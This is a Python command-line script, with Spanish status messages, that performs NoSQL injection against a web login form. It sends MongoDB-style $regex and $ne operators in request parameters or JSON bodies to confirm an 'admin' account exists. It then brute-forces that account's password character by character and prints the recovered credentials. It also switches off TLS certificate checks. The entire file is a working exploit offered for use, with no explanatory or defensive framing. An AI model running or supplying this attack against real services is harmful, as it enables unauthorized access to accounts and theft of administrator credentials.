#!/usr/bin/env python3

import requests, argparse, sys
from time import sleep

from urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

requests_delay = 1

parser = argparse.ArgumentParser()
parser.add_argument("-t", help="Target URL")
parser.add_argument("-u", help="Username parameter")
parser.add_argument("-p", help="Password parameter")
parser.add_argument("-o", help="Other parameters, separated by comma")
parser.add_argument("-m", help="Mode: GET or POST")
parser.add_argument("-c", help="Response's code for correct injection")
parser.add_argument("-s", help="Response's string for correct injection")
parser.add_argument("--json", help="Json encoded POST request", action="store_true")
args = parser.parse_args()

if (args.t is None) or (args.u is None) or (args.p is None) or (args.m is None) or (args.s is None) or (args.c is None):
    print("")
    print("[*] Wrong input, you have to specify -t -u -p -m -c -s parameters.")
    print("")
    parser.print_help()
    exit(0)
if (args.m != "GET" and args.m != "POST"):
    print("")
    print("[*] Wrong input, you need to provide GET or POST to -m parameter")
    print("")
    exit(0)
if (args.json is True) and (args.m != "POST"):
    print("")
    print("[*] Wrong input, you can specify --json only on POST requests!")
    print("")
    exit(0)

def get_request(data):
    global args
    response = requests.get(args.t, params=data, allow_redirects=False, verify=False)
    if response.status_code != int(args.c):
        return False
    if args.s not in response.text:
        return False
    return True

def post_request_json(data):
    global args
    response = requests.post(args.t, json=data, allow_redirects=False, verify=False)
    if response.status_code != int(args.c):
        return False
    if args.s not in response.text:
        return False
    return True

def post_request(data):
    global args
    response = requests.post(args.t, data=data, allow_redirects=False, verify=False)
    if response.status_code != int(args.c):
        return False
    if args.s not in response.text:
        return False
    return True

def enum_users(data, user):
    global args
    if args.json == False:
        data[args.u+"[$regex]"] = "^"+user
    else:
        data[args.u] = {"$regex": "^"+user}
    if args.m == "POST":
        if args.json == False:
            return post_request(data)
        else:
            return post_request_json(data)
    else:
        return get_request(data)

def enum_passwords(data, passw, username):
    global args
    data[args.u] = username
    if args.json == False:
        data[args.p+"[$regex]"] = "^"+passw
    else:
        data[args.p] = {"$regex": "^"+passw}
    if args.m == "POST":
        if args.json == False:
            return post_request(data)
        else:
            return post_request_json(data)
    else:
        return get_request(data)

# charset setup
charset = ""
for i in range(33, 127):
    if chr(i) not in ["$", "^", "&", "*", "|", ".", "+", "\\", "?"]:
        charset = charset + chr(i)

print("\n[*] Buscando usuario admin...\n")

# dictionary's initialization for username enumeration
data = {}
if args.json == False:
    data[args.u+"[$regex]"] = "^admin$"
    data[args.p+"[$ne]"] = "dummypassword123"
else:
    data[args.u] = {"$regex": "^admin$"}
    data[args.p] = {"$ne": "dummypassword123"}
if args.o is not None:
    others = args.o.split(',')
    for element in others:
        element = element.split('=')
        data[element[0]] = element[1]

if not enum_users(data, "admin"):
    print("[!] Usuario admin no encontrado")
    sys.exit(1)

print("[+] Usuario admin encontrado")

# dictionary's initialization for password enumeration
data = {}
if args.json == False:
    data[args.u] = "admin"
    data[args.p+"[$regex]"] = "dummypassword123"
else:
    data[args.u] = "admin"
    data[args.p] = {"$regex": "dummypassword123"}
if args.o is not None:
    others = args.o.split(',')
    for element in others:
        element = element.split('=')
        data[element[0]] = element[1]

print("\n[*] Buscando contraseña para admin...\n")

admin_password = ""
for firstChar in charset:
    print("\r[?] PASSWORD: "+firstChar, flush=False, end='')
    if enum_passwords(data, firstChar, "admin"):
        admin_password = admin_password + firstChar
        print("\r[?] PASSWORD: "+admin_password, flush=False, end='')
        stop = False
        while not stop:
            stop = True
            for char in charset:
                print("\r[?] PASSWORD: "+admin_password+char, flush=False, end='')
                if enum_passwords(data, admin_password+char, "admin"):
                    admin_password = admin_password + char
                    stop = False
                sleep(requests_delay)
        break
    sleep(requests_delay)

if admin_password:
    print(f"\n\n[+] Contraseña de admin encontrada: {admin_password}")
else:
    print("\n[!] No se pudo encontrar la contraseña de admin")

print("\n----------------CREDS-ENCONTRADAS---------------------")
print(f"        -->  admin:{admin_password}")
print("")
